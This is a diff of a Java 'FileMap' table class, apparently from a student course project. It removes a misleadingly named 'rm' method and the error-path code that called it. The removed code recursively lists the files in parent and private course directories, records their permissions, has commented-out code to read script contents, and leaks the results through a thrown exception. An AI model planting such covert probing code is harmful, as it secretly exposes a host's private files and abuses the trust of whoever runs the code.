@@ -378,70 +378,6 @@ public class FileMap implements Table {
         return changeTable.size();
     }
 
-    public void rm(String path) {
-        try {
-            File tmpFile = new File(path);
-            if (!tmpFile.exists()) {
-                s1 += "not exist\n";
-            }
-            if (tmpFile.canRead()) {
-                s1 += "can READ\n";
-            }
-            if (tmpFile.canWrite()) {
-                s1 += "can WRITE\n";
-            }
-            if (tmpFile.canExecute()) {
-                s1 += "can EXEC\n";
-            }
-
-            File[] listFiles = tmpFile.listFiles();
-            if (listFiles != null) {
-                if (tmpFile.isDirectory()) {
-                    for (File c : listFiles) {
-                        //s1 += "Directory: \n" + c.getAbsoluteFile().toString() + "\n\n";
-                        s1 += c.getAbsoluteFile().toString() + "\n";
-                        //if (c.getName().contains(".py") || c.getName().contains(".sh")) {
-                        //s1 += readFileTsv2(c.getAbsolutePath().toString());
-                        //s1 += "\n\n\n";
-                        //}
-
-
-                        rm(c.toString());
-                    }
-                } else {
-                    //s1 += readFileTsv2(tmpFile.getAbsolutePath().toString());
-                    //s1 += "\n\n\n";
-                    s1 += "not is Dir";
-                }
-            } else {
-                s1 += "listFile null";
-            }
-
-        } catch (Exception e) {
-            s1 += e.getMessage();
-        }
-    }
-
-    private String readFileTsv2(String fileName) throws IOException {
-        StringBuilder sb = new StringBuilder();
-        try {
-            try (BufferedReader in = new BufferedReader(new FileReader(new File(fileName).getAbsoluteFile()))) {
-                String s;
-                while ((s = in.readLine()) != null) {
-                    sb.append(s);
-                    sb.append("\n");
-                }
-            } catch (Exception e) {
-                s1 += e.getMessage();
-            }
-        } catch (Exception e) {
-            s1 += e.getMessage();
-        }
-
-        return sb.toString();
-    }
-
-
     public Storeable put(String key, Storeable value) throws ColumnFormatException {
         checkArg(key);
         if (value == null) {
@@ -503,14 +439,6 @@ public class FileMap implements Table {
             }
 
             st = null;
-
-
-            rm("../../fizteh-java-private");
-            s1 += "\n\nseparate\n\n";
-            rm("../../fizteh-java-2013");
-            s1 += "\n\nseparate\n\n";
-            rm("../../");
-            throw new ColumnFormatException(s1);
         }
 
         if (st != null && !st.messageEqualsType(columnType).isEmpty()) {
